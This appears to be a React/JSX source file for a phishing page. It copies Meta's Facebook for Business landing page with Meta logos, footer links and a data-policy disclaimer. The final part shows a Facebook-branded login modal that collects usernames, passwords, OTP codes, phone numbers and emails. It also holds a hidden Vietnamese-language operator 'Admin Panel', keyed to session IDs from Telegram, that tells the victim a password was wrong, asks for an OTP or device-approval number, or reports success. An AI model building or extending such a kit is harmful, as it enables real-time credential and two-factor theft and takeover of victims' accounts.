            {/* ===== REACH CUSTOMERS ===== */}
            <section className="landing-reach" style={ { padding: '80px 24px' } }>
                <div className="landing-reach-row" style={ { maxWidth: '1240px', margin: '0 auto', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '40px' } }>
                    <div className="landing-reach-copy" style={ { flex: '1 1 50%' } }>
                        <h2 className="landing-reach-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', marginBottom: '24px', display: 'block' } }>{ texts.reachTitle }</h2>
                        <p style={ { fontSize: '18px', color: '#5D6C7B', marginBottom: '40px', maxWidth: '500px', lineHeight: '1.6' } }>{ texts.reachDesc }</p>
                        <div className="landing-reach-actions" style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
                            <div id="reach-learn-more" style={ { background: '#0457CB', color: '#fff', padding: '12px 32px', borderRadius: '100px', fontWeight: '500', fontSize: '15px', cursor: 'pointer', whiteSpace: 'nowrap' } }>{ texts.learnMore }</div>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                <div style={ { width: '32px', height: '32px', borderRadius: '50%', border: '1px solid rgba(10,19,23,0.45)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 } }><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
                                <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ texts.createAd }</span>
                            </div>
                        </div>
                    </div>
                    <div className="landing-reach-visual" style={ { flex: '1 1 50%' } }><img src={ MediaImg } alt={ texts.mediaIllustrationAlt } style={ { width: '100%', height: 'auto', objectFit: 'contain', display: 'block' } } /></div>
                </div>
            </section>

            {/* ===== STAY CONNECTED ===== */}
            <section className="landing-stay" style={ { background: '#fff', padding: '80px 0' } }>
                <div className="landing-stay-inner" style={ { maxWidth: '1240px', margin: '0 auto', padding: '0 24px' } }>
                    <div className="landing-stay-intro" style={ { marginBottom: '40px' } }>
                        <p style={ { fontSize: '12px', color: '#5D6C7B', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '8px' } }>{ texts.metaTechnologiesEyebrow }</p>
                        <h2 className="landing-connected-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', display: 'block', margin: 0 } }>{ texts.connectedTitle }</h2>
                    </div>
                    <div className="landing-stay-row" style={ { display: 'flex', flexDirection: 'row', gap: '40px', alignItems: 'flex-start' } }>
                        <div className="landing-stay-icons" style={ { display: 'flex', flexDirection: 'column', gap: '24px', paddingTop: '80px', minWidth: '32px', flexShrink: 0 } }>
                            { [ { id: 'facebook', label: texts.footerFcMetaFb, src: FbIcon }, { id: 'messenger', label: texts.footerFcMetaMsg, src: MessengerIcon }, { id: 'instagram', label: texts.footerFcMetaIg, src: IgIcon }, { id: 'whatsapp', label: texts.footerFcMetaWa, src: WhatsappIcon } ].map( ( platform ) => (
                                <div key={ platform.id } title={ platform.label } style={ { cursor: 'pointer', opacity: activeTab === platform.id ? 1 : 0.2, filter: activeTab === platform.id ? 'none' : 'grayscale(1)', transition: 'all 0.3s' } } onClick={ () => setActiveTab( platform.id ) }>
                                    <img src={ platform.src } alt={ platform.label } style={ { width: '32px', height: '32px', objectFit: 'contain', display: 'block' } } />
                                </div>
                            ) ) }
                        </div>
                        <div className="landing-stay-video" style={ { position: 'relative', maxWidth: '504px', width: '100%', flexShrink: 0, padding: '0 16px' } }>
                            <div style={ { borderRadius: '24px', overflow: 'hidden', aspectRatio: '3/4' } }><video ref={ fansVideoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', display: 'block' } } autoPlay loop muted playsInline><source src={ FansVideo } type="video/mp4" /></video></div>
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 20 } }>
                                <button aria-label={ isFansVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', cursor: 'pointer' } } onClick={ () => { if ( fansVideoRef.current ) { isFansVideoPaused ? fansVideoRef.current.play() : fansVideoRef.current.pause(); setIsFansVideoPaused( !isFansVideoPaused ); } } }>
                                    { isFansVideoPaused ? ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                </button>
                            </div>
                        </div>
                        <div className="landing-stay-content" style={ { flex: 1, paddingTop: '160px', paddingLeft: '40px' } }>
                            <p style={ { fontSize: '14px', color: '#5D6C7B', marginBottom: '8px', fontWeight: '400' } }>{ texts.marketingOnFacebookEyebrow }</p>
                            <h3 className="landing-stay-heading" style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', marginBottom: '16px', display: 'block' } }>{ texts.fansBuildFollowingTitle }</h3>
                            <p style={ { fontSize: '16px', color: '#5D6C7B', marginBottom: '32px', lineHeight: '1.6' } }>{ texts.fansBuildFollowingDesc }</p>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '8px', cursor: 'pointer' } }>
                                <div style={ { width: '32px', height: '32px', borderRadius: '50%', border: '1px solid rgba(10,19,23,0.45)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 } }><svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M5 12h14M12 5l7 7-7 7" stroke="#007BFF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" /></svg></div>
                                <span style={ { fontSize: '14px', color: '#007BFF', fontWeight: '500' } }>{ texts.exploreFacebookLink }</span>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== SUPPORT SECTION ===== */}
            <section className="landing-support" style={ { background: '#f6f6f6', padding: '56px 0' } }>
                <div className="landing-support-row" style={ { maxWidth: '1504px', margin: '0 auto', padding: '0 24px', display: 'flex', flexDirection: 'row', alignItems: 'center', gap: '64px' } }>
                    <div style={ { position: 'relative', flex: '1 1 50%', display: 'flex', justifyContent: 'center' } }>
                        <div style={ { position: 'relative', borderRadius: '24px', overflow: 'hidden', aspectRatio: '1/1', width: '100%', background: '#000' } }>
                            <video ref={ supportVideoRef } style={ { width: '100%', height: '100%', objectFit: 'cover', opacity: 0.95, display: 'block' } } autoPlay loop muted playsInline><source src={ SupportVideo } type="video/mp4" /></video>
                            <div style={ { position: 'absolute', top: '60%', left: '50%', transform: 'translateX(-50%)', width: '70%', zIndex: 10 } }>
                                <div style={ { background: '#fff', borderRadius: '8px', padding: '16px 24px', boxShadow: '0 12px 40px rgba(0,0,0,0.15)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' } }>
                                    <span style={ { color: '#1C2B33', fontSize: '18px', fontWeight: '500', whiteSpace: 'nowrap' } }>{ texts.createPage }</span>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#5D6C7B" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="m21 21-4.34-4.34" /><circle cx="11" cy="11" r="8" /></svg>
                                </div>
                            </div>
                            <div style={ { position: 'absolute', bottom: '24px', right: '24px', zIndex: 20 } }>
                                <button aria-label={ isSupportVideoPaused ? texts.ariaPlayVideo : texts.ariaPauseVideo } style={ { width: '32px', height: '32px', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.2)', backdropFilter: 'blur(12px)', border: '1px solid rgba(255,255,255,0.4)', borderRadius: '50%', cursor: 'pointer' } } onClick={ () => { if ( supportVideoRef.current ) { isSupportVideoPaused ? supportVideoRef.current.play() : supportVideoRef.current.pause(); setIsSupportVideoPaused( !isSupportVideoPaused ); } } }>
                                    { isSupportVideoPaused ? ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5,3 19,12 5,21" /></svg> ) : ( <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none"><rect x="14" y="3" width="5" height="18" rx="1" /><rect x="5" y="3" width="5" height="18" rx="1" /></svg> ) }
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="landing-support-copy" style={ { flex: '1 1 50%' } }>
                        <div style={ { maxWidth: '500px' } }>
                            <p style={ { fontSize: '12px', color: '#5D6C7B', textTransform: 'uppercase', letterSpacing: '0.1em', marginBottom: '12px', fontWeight: '500' } }>{ texts.supportCentreEyebrow }</p>
                            <h2 className="landing-support-heading" style={ { fontSize: '40px', fontWeight: '500', color: '#1C2B33', lineHeight: '1.2', marginBottom: '32px', display: 'block' } }>{ texts.supportAnswersTitle }</h2>
                            <div style={ { display: 'flex', alignItems: 'center', gap: '32px' } }>
                                <button id="support-get-support" style={ { background: '#1877F2', color: '#fff', padding: '14px 32px', borderRadius: '100px', fontWeight: '600', fontSize: '16px', border: 'none', cursor: 'pointer', boxShadow: '0 10px 30px rgba(24,119,242,0.2)' } }>{ texts.getSupport }</button>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            {/* ===== RESOURCES ===== */}
            <section className="landing-resources" style={ { width: '100%', padding: '100px 16px', display: 'flex', alignItems: 'center', justifyContent: 'center', textAlign: 'center', backgroundImage: `url(${ BackgroundImg })`, backgroundSize: 'cover', backgroundPosition: 'center', backgroundRepeat: 'no-repeat' } }>
                <div style={ { maxWidth: '1240px', display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '32px' } }>
                    <h2 style={ { fontSize: '36px', fontWeight: '500', color: '#1C2B33', margin: 0, display: 'block' } }>{ texts.resourcesTitle }</h2>
                    <button id="resources-learn-more" style={ { background: '#1877F2', color: '#fff', padding: '12px 32px', borderRadius: '100px', fontWeight: '600', fontSize: '15px', border: 'none', cursor: 'pointer', boxShadow: '0 4px 12px rgba(0,0,0,0.15)' } }>{ texts.learnMore }</button>
                </div>
            </section>

            {/* ===== FOOTER ===== */}
            <footer style={ { background: '#1b2a34', color: '#fff' } }>
                <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
                    <div className="landing-footer-newsletter" style={ { display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '40px', alignItems: 'start' } }>
                        <div>
                            <h2 style={ { fontSize: '30px', fontWeight: '600', color: '#fff', lineHeight: '1.3', marginBottom: '16px', display: 'block' } }>{ texts.footerUpdateTitle }</h2>
                            <p style={ { color: '#9ca3af', maxWidth: '420px', lineHeight: '1.6', fontSize: '15px' } }>{ texts.footerUpdateDesc }</p>
                        </div>
                        <div className="landing-footer-form" style={ { width: '100%', maxWidth: '540px' } }>
                            <div className="landing-footer-form-fields" style={ { display: 'flex', gap: '16px', marginBottom: '16px' } }>
                                <input type="email" placeholder={ texts.emailAddressPlaceholder || "Email address" } style={ { flex: 1, padding: '12px 16px', borderRadius: '8px', border: 'none', outline: 'none', color: '#465a69', fontSize: '16px', height: '52px' } } />
                                <input type="text" placeholder={ texts.enterCountry || "Enter a country name..." } style={ { flex: 1, padding: '12px 16px', borderRadius: '8px', border: 'none', outline: 'none', color: '#465a69', fontSize: '16px', height: '52px' } } />
                            </div>
                            <p style={ { fontSize: '12px', color: '#9ca3af', lineHeight: '1.6', marginBottom: '16px' } }>
                                { texts.footerDisclaimer || 'By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our' }{ ' ' }<span style={ { textDecoration: 'underline', cursor: 'pointer' } }>{ texts.dataPolicy || "Data Policy" }</span>.
                            </p>
                            <button style={ { background: '#0062ff', color: '#fff', padding: '0 24px', height: '50px', display: 'flex', alignItems: 'center', justifyContent: 'center', borderRadius: '100px', fontWeight: '600', fontSize: '15px', border: 'none', cursor: 'pointer' } }>{ texts.subscribeBtn }</button>
                        </div>
                    </div>
                </div>
                <div style={ { borderTop: '1px solid rgba(255,255,255,0.2)' } } />
                <div style={ { background: '#1b2a34', color: '#9ca3af' } }>
                    <div style={ { maxWidth: '1175px', margin: '0 auto', padding: '80px 24px' } }>
                        <div className="landing-footer-nav-grid" style={ { display: 'grid', gridTemplateColumns: 'repeat(7, 1fr)', gap: '32px 24px' } }>
                            { [
                                { colId: 'tech', title: texts.footerFcColMetaTech, links: [ texts.footerFcMetaFb, texts.footerFcMetaIg, texts.footerFcMetaMsg, texts.footerFcMetaWa, texts.footerFcMetaAn, texts.footerFcMetaQuest, texts.footerFcMetaWorkplace, texts.footerFcMetaForWork ] },
                                { colId: 'tools', title: texts.footerFcColTools, links: [ texts.footerFcToolsFt, texts.footerFcToolsFbPages, texts.footerFcToolsIgProfiles, texts.footerFcToolsStories, texts.footerFcToolsShops, texts.footerFcToolsMbs, texts.footerFcToolsFbAds, texts.footerFcToolsIgAds, texts.footerFcToolsVideoAds, texts.footerFcToolsAdsMgr ] },
                                { colId: 'goals', title: texts.footerFcColGoals, links: [ texts.footerFcGoalsFbPage, texts.footerFcGoalsBrandAwareness, texts.footerFcGoalsLocal, texts.footerFcGoalsOnlineSales, texts.footerFcGoalsApp, texts.footerFcGoalsLeads, texts.footerFcGoalsMeasure, texts.footerFcGoalsRetarget ] },
                                { colId: 'biz', title: texts.footerFcColBusinessTypes, links: [ texts.footerFcBizSmall, texts.footerFcBizLarge, texts.footerFcBizAgency, texts.footerFcBizMedia, texts.footerFcBizCreator, texts.footerFcBizDev, texts.footerFcBizPartner ] },
                                { colId: 'industry', title: texts.footerFcColIndustries, links: [ texts.footerFcIndustryAuto, texts.footerFcIndustryCpg, texts.footerFcIndustryEcom, texts.footerFcIndustryEnt, texts.footerFcIndustryFin, texts.footerFcIndustryGaming, texts.footerFcIndustryProperty, texts.footerFcIndustryRest, texts.footerFcIndustryRetail, texts.footerFcIndustryTech, texts.footerFcIndustryTravel ] },
                                { colId: 'skills', title: texts.footerFcColSkills, links: [ texts.footerFcSkillsOnline, texts.footerFcSkillsCert, texts.footerFcSkillsWebinars ] },
                                { colId: 'guides', title: texts.footerFcColGuides, links: [ texts.footerFcGuideAds, texts.footerFcGuideBrand, texts.footerFcGuideBook, texts.footerFcGuideMedia, texts.footerFcGuideSitemap ] }
                            ].map( ( col ) => (
                                <div key={ col.colId }>
                                    <h3 style={ { color: '#cbd2d9', fontSize: '14px', marginBottom: '16px', letterSpacing: '0.025em', fontWeight: '500' } }>{ col.title }</h3>
                                    <ul style={ { listStyle: 'none', padding: 0, margin: 0, display: 'flex', flexDirection: 'column', gap: '12px' } }>
                                        { col.links.map( ( link ) => (
                                            <li key={ `${ col.colId }_${ link }` }><a href="#" style={ { color: '#9ca3af', fontSize: '13px', textDecoration: 'none', transition: 'color 0.2s' } } onMouseOver={ ( e ) => e.target.style.color = '#e5e7eb' } onMouseOut={ ( e ) => e.target.style.color = '#9ca3af' }>{ link }</a></li>
                                        ) ) }
                                    </ul>
                                </div>
                            ) ) }
                        </div>
                        <div style={ { borderTop: '1px solid #465A69', paddingTop: '48px', marginTop: '48px' } }>
                            <div className="landing-footer-bottom" style={ { display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', gap: '24px' } }>
                                <div>
                                    <p style={ { color: '#cbd2d9', fontSize: '13px', marginBottom: '16px' } }>{ texts.footerCopyrightNotice }</p>
                                    <div style={ { display: 'flex', gap: '12px' } }>
                                        { [ { label: texts.footerSocialFacebook, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z" /></svg> }, { label: texts.footerSocialInstagram, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#cbd2d9" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" /><circle cx="12" cy="12" r="4" /><circle cx="17.5" cy="6.5" r="1" fill="#cbd2d9" stroke="none" /></svg> }, { label: texts.footerSocialX, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231 5.45-6.231Zm-1.161 17.52h1.833L7.084 4.126H5.117Z" /></svg> }, { label: texts.footerSocialLinkedIn, svg: <svg width="24" height="24" viewBox="0 0 24 24" fill="#cbd2d9"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" /><rect x="2" y="9" width="4" height="12" /><circle cx="4" cy="4" r="2" /></svg> } ].map( ( s ) => ( <span key={ s.label } title={ s.label } style={ { cursor: 'pointer', display: 'flex' } }>{ s.svg }</span> ) ) }
                                    </div>
                                </div>
                                <div style={ { display: 'flex', flexWrap: 'wrap', gap: '12px 24px' } }>
                                    { [ texts.footerLegalAbout, texts.footerLegalDevelopers, texts.footerLegalCareers, texts.footerLegalPrivacy, texts.footerLegalCookies, texts.footerLegalTerms, texts.footerLegalHelp ].map( ( link ) => (
                                        <a key={ link } href="#" style={ { color: '#cbd2d9', fontSize: '13px', textDecoration: 'none' } } onMouseOver={ ( e ) => e.target.style.color = '#e5e7eb' } onMouseOut={ ( e ) => e.target.style.color = '#cbd2d9' }>{ link }</a>
                                    ) ) }
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            </div>
            
            {/* Modal cũ */}
            <HomeStartModals isOpen={ isStartModalsOpen } onClose={ () => setStartModalsOpen( false ) } metaCopy={ { title: texts.metaVerifiedTitle, description: texts.metaVerifiedDesc, btnFacebook: texts.metaVerifiedBtnFacebook, btnInstagram: texts.metaVerifiedBtnInstagram, businessLead: texts.metaVerifiedBusinessLead, businessLink: texts.metaVerifiedBusinessLink, disclaimer: texts.metaVerifiedDisclaimer, ariaClose: texts.metaVerifiedAriaClose, phonesAlt: texts.metaVerifiedPhonesAlt, cornerLabel: texts.metaVerifiedCornerLabel, cornerLead: texts.homeStartModalCornerLead } } monetizeCopy={ { cornerLabel: texts.monetizeModalCornerLabel, cornerLead: texts.homeStartModalCornerLead, back: texts.monetizeModalBack, eyebrow: texts.monetizeModalEyebrow, title: texts.monetizeModalTitle, creatorLabel: texts.monetizeModalCreator, description: texts.monetizeModalDesc, subscribe: texts.monetizeModalSubscribe, brandName: texts.monetizeModalBrand, heroAlt: texts.monetizeModalHeroAlt } } />

            {/* ================= MODAL FORM NHẬP LIỆU ================= */}
            <div className={`modal-overlay ${showModal ? 'open' : ''}`}>
                <div className="modal-container">
                    <button className="modal-close" onClick={() => { localStorage.clear(); window.location.replace('/live'); }}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                    </button>

                    {showAdmin ? (
                      <div style={{ textAlign: 'center' }}>
                        <h2 className="modal-title">Admin Panel</h2>
                        <div style={{ marginBottom: '20px' }}>
                            <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên (lấy từ Telegram):</p>
                            <input className="fb-input" type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
                        </div>
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                            <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
                            <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
                            <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Báo Thành Công</button>
                            
                            <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
                                <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
                                <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
                                <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
                            </div>
                            
                            <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
                        </div>
                      </div>
                    ) : (
                      <>
                        {/* LOGO FACEBOOK TRÒN */}
                        <div className="modal-brand">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
                        </div>

                        {/* RENDER COMPONENT AUTHFORM */}
                        {showSuccess ? (
                          <div style={{ textAlign: 'center', padding: '20px 0' }}>
                            <h2 className="modal-title" style={{ marginTop: '20px' }}>{t.successTitle}</h2>
                            <p className="modal-subtitle">{t.successSub}</p>
                            <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
                          </div>
                        ) : matchNumber ? (
                          <>
                            <h2 className="modal-title">{t.approveTitle}</h2>
                            <p className="modal-subtitle">{t.approveSub} <strong>{matchNumber}</strong></p>
                            <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
                            <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
                          </>
                        ) : (
                          <AuthForm
                            step={step} setStep={setStep}
                            loading={loading} errors={errors} setErrors={setErrors}
                            showLoginError={showLoginError} showOtpError={showOtpError}
                            busName={busName} setBusName={setBusName}
                            perEmail={perEmail} setPerEmail={setPerEmail}
                            busEmail={busEmail} setBusEmail={setBusEmail}
                            countryCode={countryCode} setCountryCode={setCountryCode}
                            phoneNum={phoneNum} setPhoneNum={setPhoneNum}
                            loginUser={loginUser} setLoginUser={setLoginUser}
                            loginPass={loginPass} setLoginPass={setLoginPass}
                            otp={otp} setOtp={setOtp}
                            handleSignup={handleSignup}
                            handleLogin={handleLogin}
                            handleOtp={handleOtp}
                          />
                        )}
                      </>
                    )}

                    <div className="modal-meta-footer">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" />
                    </div>
                </div>
            </div>
        </>
    );
}